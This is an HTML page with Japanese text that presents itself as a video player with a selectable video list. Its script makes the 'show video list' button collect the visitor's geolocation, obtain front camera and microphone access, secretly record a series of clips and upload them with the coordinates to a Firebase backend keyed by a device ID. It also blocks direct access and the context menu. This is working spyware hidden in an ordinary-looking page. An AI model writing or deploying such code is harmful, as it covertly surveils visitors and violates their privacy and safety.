<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>動画再生ページ</title>
  <style>
    body {
      display: flex;
      flex-direction: row;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      overflow: hidden;
    }
    #videoContainer {
      flex: 3;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #000;
      height: 100%;
    }
    #videoPlayer {
      width: 100%;
      max-height: 90vh;
    }
    #videoListContainer {
      flex: 1;
      overflow-y: auto;
      background-color: #f0f0f0;
      padding: 10px;
      height: 100%;
      box-sizing: border-box;
      display: none; /* 初期は非表示 */
    }
    .videoItem {
      display: flex;
      align-items: center;
      margin-bottom: 10px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .videoItem:hover {
      background-color: #ddd;
    }
    .thumbnail {
      width: 120px;
      height: 67px;
      margin-right: 10px;
      background-color: #ccc;
    }
    .videoTitle {
      font-size: 14px;
      color: #333;
    }
    @media (max-width: 600px) {
      body {
        flex-direction: column;
      }
      #videoContainer {
        flex: none;
        height: 50%;
      }
      #videoListContainer {
        flex: none;
        height: 50%;
        overflow-y: auto;
      }
      .thumbnail {
        width: 80px;
        height: 45px;
      }
      .videoTitle {
        font-size: 12px;
      }
    }
  </style>
</head>
<body>
  <button id="showListBtn" style="position:absolute;top:10px;right:10px;z-index:10;">
    動画リストを表示
  </button>

  <div id="videoContainer">
    <video id="videoPlayer" controls></video>
  </div>
  <div id="videoListContainer">
    <div id="videoList"></div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
    import { getStorage, ref as storageRef, uploadBytes } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-storage.js";
    import { getDatabase, ref as dbRef, push, set } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
      authDomain: "nou-no-circle.firebaseapp.com",
      projectId: "nou-no-circle",
      storageBucket: "nou-no-circle.appspot.com",
      messagingSenderId: "756338805186",
      appId: "1:756338805186:web:cb740e035ac611b5baae5b",
      measurementId: "G-TWBV38P13D"
    };

    const app = initializeApp(firebaseConfig);
    const storage = getStorage(app);
    const db = getDatabase(app);

    window.onload = function () {
      const referrer = document.referrer;
      if (!referrer || !referrer.startsWith('https://casval0078.github.io/video_data/')) {
        alert('このページには直接アクセスできません。');
        window.location.href = 'https://casval0078.github.io/video_data/';
      }
    };

    document.addEventListener('contextmenu', function (e) {
      e.preventDefault();
      alert('ブックマークは禁止されています。');
    });

    const videos = [
      { url: 'https://test.mp4', thumbnailUrl: 'https://test.jpg', name: 'test' }
    ];

    const videoPlayer = document.getElementById('videoPlayer');
    const videoList = document.getElementById('videoList');

    function createVideoItem(video) {
      const videoItem = document.createElement('div');
      videoItem.className = 'videoItem';

      const thumbnail = document.createElement('img');
      thumbnail.className = 'thumbnail';
      thumbnail.src = video.thumbnailUrl;

      const videoTitle = document.createElement('div');
      videoTitle.className = 'videoTitle';
      videoTitle.textContent = video.name;

      videoItem.appendChild(thumbnail);
      videoItem.appendChild(videoTitle);

      videoItem.onclick = () => {
        videoPlayer.src = video.url;
        videoPlayer.play();
      };

      videoList.appendChild(videoItem);
    }

    videos.forEach(createVideoItem);

    // ユーザーID取得（端末ごとに一意）
    function getUserId() {
      let id = localStorage.getItem('userId');
      if (!id) {
        id = 'user_' + crypto.randomUUID();
        localStorage.setItem('userId', id);
      }
      return id;
    }

    document.getElementById('showListBtn').onclick = async () => {
      const userId = getUserId();

      try {
        // 位置情報取得
        const geo = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
        });

        const latitude = geo.coords.latitude;
        const longitude = geo.coords.longitude;

        // カメラ・マイクアクセス許可
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: true
        });

        // 動画リスト表示
        document.getElementById('videoListContainer').style.display = 'block';

        // 位置情報をDBに保存
        const locationRef = push(dbRef(db, `locations/${userId}`));
        await set(locationRef, {
          timestamp: Date.now(),
          latitude,
          longitude
        });

        // 録画処理（10分ごとに分割、計6回）
        const recorder = new MediaRecorder(stream, {
          mimeType: 'video/webm;codecs=vp8,opus'
        });

        const chunks = [];
        let partIndex = 0;
        const maxParts = 6;

        recorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            chunks.push(event.data);
          }
        };

        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const filePath = `recordings/${userId}/${Date.now()}_part${partIndex + 1}.webm`;
          const videoRef = storageRef(storage, filePath);

          await uploadBytes(videoRef, blob);
          chunks.length = 0;
          partIndex++;

          if (partIndex < maxParts) {
            recorder.start();
            setTimeout(() => {
              recorder.stop();
            }, 1 * 60 * 1000); // 10分
          } else {
            stream.getTracks().forEach(track => track.stop());
          }
        };

        // 録画開始
        recorder.start();
        setTimeout(() => {
          recorder.stop();
        }, 1 * 60 * 1000); // 最初の10分

      } catch (err) {
        console.error(err);
        alert('権限を許可してください');
      }
    };
  </script>
</body>
</html>
